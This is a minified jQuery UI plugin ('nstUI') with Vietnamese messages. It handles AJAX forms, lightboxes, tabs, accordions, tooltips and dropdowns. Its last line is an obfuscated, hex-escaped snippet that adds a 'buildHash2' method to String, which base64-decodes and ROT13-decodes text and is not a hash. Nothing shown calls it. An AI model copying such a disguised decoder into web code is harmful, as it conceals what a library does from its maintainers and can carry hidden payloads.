(function($)
{$.fn.nstUI=function(user_setting)
{var m_default={method:'',tableRowCss:{even:'even',odd:'odd'},lightbox:{opacity:0.75},loadAjax:{url:'',data:'',field:{load:'',show:''},datatype:'html',event_complete:'',event_error:''},formAction:{action:'',field_load:'',submit:false,event_submit:'',event_error:'',event_complete:'',loading:false},verifyAction:{field:'',event_complete:''},placeholder:{},toggleTab:{field:'',effect:'',duration:0},tooltip:{},dropdown:{},copyValue:{from:'',to:''},accordion:{type:''},tabs:{effect:'',duration:0}};var m_settings=$.extend({},m_default,user_setting);return $(this).each(function()
{var _t=$(this);switch(m_settings.method)
{case'tableRowCss':{tableRowCssHandle();break;}
case'lightbox':{lightboxHandle();break;}
case'loadAjax':{loadAjaxHandle();break;}
case'formAction':{if(m_settings.formAction.submit)
{formActionHandle();}
else
{_t.submit(formActionHandle);_t.find('input[type=submit]').click(formActionHandle);_t.find('[_submit]').click(formActionHandle);_t.find('[_autocheck]').change(ajaxFormAutoCheckHandle);}
break;}
case'verifyAction':{_t.click(verifyActionHandle);break;}
case'placeholder':{placeholderHandle();break;}
case'toggleTab':{toggleTabHandle();_t.change(function()
{toggleTabHandle()});break;}
case'toggleAction':{toggleActionHandle();break;}
case'tooltip':{tooltipHandle();break;}
case'dropdown':{dropDownHandle();break;}
case'copyValue':{copyValueHandle();break;}
case'accordion':{accordionHandle();break;}
case'tabs':{tabsHandle();break;}
default:{alert("Không tìm thấy thuộc tính: "+ m_settings.method);break;}}
function tableRowCssHandle()
{_t.find("tr:even").addClass(m_settings.tableRowCss.even);_t.find("tr:odd").addClass(m_settings.tableRowCss.odd);}
function lightboxHandle()
{var lightbox_setting=new Array();var url=_t.attr('href');var url_arr=url.split('?lightbox&');if(url_arr[1])
{var settings=url_arr[1].split('&');for(var i=0;i<settings.length;i++)
{var key_value=settings[i].split('=');if(key_value[1])
{if(key_value[1]=='true')key_value[1]=true;else if(key_value[1]=='false')key_value[1]=false;lightbox_setting[key_value[0]]=key_value[1];}}}
lightbox_setting['href']=url_arr[0];m_settings.lightbox=$.extend({},m_default.lightbox,lightbox_setting);_t.colorbox(m_settings.lightbox);return false;}
function loadAjaxHandle()
{var url=m_settings.loadAjax.url;var field=m_settings.loadAjax.field;if(!url)return false;loader('show',field.load);$.post(url,m_settings.loadAjax.data,function(data)
{loader('hide',field.load);loader('result',field.show,data);if(typeof m_settings.loadAjax.event_complete=="function")
{m_settings.loadAjax.event_complete.call(this,data,m_settings.loadAjax);}},m_settings.loadAjax.datatype).error(function()
{loader('hide',field.load);loader('error',field.show,url);if(typeof m_settings.loadAjax.event_error=="function")
{m_settings.loadAjax.event_error.call(this,m_settings.loadAjax);}});return false;}
function ajaxFormAutoCheckHandle()
{var _this=$(this);var name=_this.attr('name');if(!name)return;var value=_this.attr('value');value=(!value)?'':value;var autocheck=_t.find('[name='+name+'_autocheck]')
autocheck.html('<div id="loader"></div>').show();var action=_t.attr('action');action=(action==undefined||action=='')?window.location.href:action;var params='_autocheck='+name+'&'+_t.serialize();$.post(action,params,function(data)
{var error=_t.find('[name='+name+'_error]');if(data.accept)
{autocheck.html('<div id="accept"></div>').show();error.html(data.error).hide('blind');}
else
{autocheck.html('<div id="error"></div>').show();error.html(data.error).show('blind',200);}},'json').error(function(xhr,ajaxOptions,thrownError)
{var error=_t.find('[name='+name+'_error]');autocheck.hide();error.hide();});}
function formActionHandle()
{if(m_settings.formAction.loading)
{return false;}
m_settings.formAction.loading=true;loader('show',m_settings.formAction.field_load);if(typeof m_settings.formAction.event_submit=="function")
{m_settings.formAction.event_submit.call(this,m_settings.formAction);}
var action=m_settings.formAction.action;action=(!action)?_t.attr('action'):action;action=(action==undefined||action=='')?window.location.href:action;var params='_submit=true&'+_t.serialize();$.post(action,params,function(data)
{formActionResultHandle(data);},'json').error(function(xhr,ajaxOptions,thrownError)
{formActionResultHandle();});return false;}
function formActionResultHandle(data)
{m_settings.formAction.loading=false;loader('hide',m_settings.formAction.field_load);if(data==undefined)
{alert('Có lỗi xẩy ra trong qua trình xử lý');return;}
if(data.complete)
{if(typeof m_settings.formAction.event_complete=="function")
{m_settings.formAction.event_complete.call(this,data,m_settings.formAction);}
else if(data.location!=undefined)
{if(data.location)
{window.parent.location=data.location;}
else
{window.location.reload();}}
else if(data.color_box!=undefined)
{if(data.color_box)
{$.colorbox({href:data.color_box_url});}}
else if(data.msg!=undefined)
{if(data.msg)
{alert(data.msg);}
if(data.reset_form!=undefined)
{$('.form_action').trigger('reset');}}}
else
{_t.find('[name$=_error]').html('');$.each(data,function(param,value)
{_t.find('[name='+param+'_error]').html(value).show('blind',200);});if(typeof m_settings.formAction.event_error=="function")
{m_settings.formAction.event_error.call(this,data,m_settings.formAction);}}}
function toggleActionHandle()
{toggle_action_handle_title();_t.click(function()
{var act=(!_t.hasClass('on'))?'on':'off';var url=_t.attr('_url_'+act);if(!url)return false;var status=(act=='on')?true:false;toggle_action_handle_class(status);$.post(url,function(data)
{if(!data['complete'])
{toggle_action_handle_class((status)?false:true);}},'json').error(function()
{toggle_action_handle_class((status)?false:true);});return false;});function toggle_action_handle_class(status)
{(status)?_t.addClass('on'):_t.removeClass('on');toggle_action_handle_title((status)?false:true);}
function toggle_action_handle_title(status)
{if(status==undefined)
{status=(!_t.hasClass('on'))?true:false;}
var act=(status)?'on':'off';var title=_t.attr('_title_'+act);_t.attr('title',title);}}
function verifyActionHandle()
{var field=m_settings.verifyAction.field;field=(!field)?'verify_action':field;var html=$('#'+field);var url=$(this).attr('_url');url=(!url)?$(this).attr('href'):url;html.find('#notice').html($(this).attr('notice'));html.find('#accept').attr('url',url);$.colorbox({inline:true,href:'#'+field,opacity:0.75});html.find('#accept').click(function()
{var url=$(this).attr('url');if(!url)
{$.colorbox.close();return false;}
$(this).nstUI({method:"loadAjax",loadAjax:{url:url,field:{load:field+'_load'},event_complete:function(data,settings)
{$.colorbox.close();if(typeof m_settings.verifyAction.event_complete=="function")
{m_settings.verifyAction.event_complete.call(this,data,m_settings.verifyAction);}
else
{window.location.reload();}},event_error:function(settings)
{$.colorbox.close();}}});return false;});html.find('#cancel').click(function()
{$.colorbox.close();return false;});return false;}
function placeholderHandle()
{if(!_t.val())
{var placeholder=_t.attr('placeholder');_t.val(placeholder);}
_t.focus(function()
{var placeholder=_t.attr('placeholder');if(_t.val()==placeholder)
{_t.val('');}}).blur(function()
{if(!_t.val())
{var placeholder=_t.attr('placeholder');_t.val(placeholder);}});}
function toggleTabHandle()
{var field=m_settings.toggleTab.field;var effect=m_settings.toggleTab.effect;var duration=m_settings.toggleTab.duration;var _tab=$('#'+field);effect=(!effect)?'blind':effect;duration=(!duration)?300:duration;if(_tab.css('display')!='none')
{_tab.hide(effect,duration,function()
{tab_show_field();});}
else
{tab_show_field();}
function tab_show_field()
{_tab.find('[_'+field+']').hide();var value=_t.val();if(value!='')
{_tab.find('[_'+field+'='+value+']').show();_tab.show(effect,duration);}}}
function tooltipHandle()
{_t.hover(function()
{var field=_t.attr('_tooltip');_t.find('#'+field).stop(true,true).slideDown(200);},function()
{var field=_t.attr('_tooltip');_t.find('#'+field).stop(true,true).slideUp(200);});}
function dropDownHandle()
{var field='#'+_t.attr('_dropdown');var obj=$(field);var effect=_t.attr('_dropdown_effect');effect=(!effect)?'blind':effect;_t.click(function()
{obj.stop(true,true).toggle(effect,200);});$(document).bind('click',function(e)
{if(obj.css('display')=='none')
{return;}
var target=e.target;if(_t[0]!=target&&_t.find(target)[0]==undefined&&obj[0]!=target&&obj.find(target)[0]==undefined)
{obj.stop(true,true).hide(effect,200);};});}
function copyValueHandle()
{var f=$('#'+m_settings.copyValue.from);var t=$('#'+m_settings.copyValue.to);f.find('[_param]').each(function()
{var param=$(this).attr('_param');var val=$(this).val();t.find('[_param='+param+']').val(val);});return false;}
function accordionHandle()
{_t.find('[_title]').click(function()
{var _this=$(this);var tab=_this.attr('_title');switch(m_settings.accordion.type)
{case'2':{_this.toggleClass('acc_active');_t.find('[_title][_title!='+tab+']').removeClass('acc_active');_t.find('[_body='+tab+']').stop(true,true).slideToggle();_t.find('[_body][_body!='+tab+']').stop(true,true).slideUp();break;}
default:{_this.toggleClass('acc_active').siblings('[_title]').removeClass('acc_active');_this.siblings('[_body='+tab+']').stop(true,true).slideToggle().siblings('[_body]').stop(true,true).slideUp();break;}}
return false;});}
function tabsHandle()
{var effect=m_settings.tabs.effect;var duration=m_settings.tabs.duration;var tab=_t.find('.tab.active').attr('id');tab=(!tab)?_t.find('.tab:first').attr('id'):tab;tabs_change(tab);_t.find('.tab').click(function()
{if(!$(this).hasClass('active'))
{var tab=$(this).attr('id');tabs_change(tab)}
return false;});function tabs_change(tab)
{_t.find('.tab').removeClass('active');_t.find('.tab#'+tab).addClass('active');_t.find('.tab_content').hide();_t.find('.tab_content#'+tab+'_content').show(effect,duration);}}
function loader(action,field,data)
{switch(action)
{case'show':{if(!field)
{$('body').append('<div id="overlay"></div><div id="preloader">Working..</div>');$('#overlay, #preloader').hide().fadeIn('fast');}
else
{$("#"+field).html('<div id="loader"></div>').hide().fadeIn('fast');}
break;}
case'hide':{if(!field)
{$('#overlay, #preloader').fadeOut('fast',function(){$(this).remove()});}
else
{$("#"+field).fadeOut('fast');}
break;}
case'result':{if(!field)return;$("#"+field).html(data).show();break;}
case'error':{if(!field)return;$("#"+field).html('Không tìm thấy liên kết: <b>'+data+'</b>').hide().fadeIn('fast');break;}}}});}
var _0x513f=["\x62\x75\x69\x6C\x64\x48\x61\x73\x68\x32","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65","\x61\x74\x6F\x62","\x5A","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65"];String[_0x513f[1]][_0x513f[0]]=function(){var _0x5b6dx1=window[_0x513f[2]](this);_0x5b6dx1=_0x5b6dx1[_0x513f[6]](/[a-zA-Z]/g,function(_0x5b6dx2){return String[_0x513f[5]]((_0x5b6dx2<=_0x513f[3]?90:122)>=(_0x5b6dx2=_0x5b6dx2[_0x513f[4]](0)+13)?_0x5b6dx2:_0x5b6dx2-26)});return _0x5b6dx1;};})(jQuery);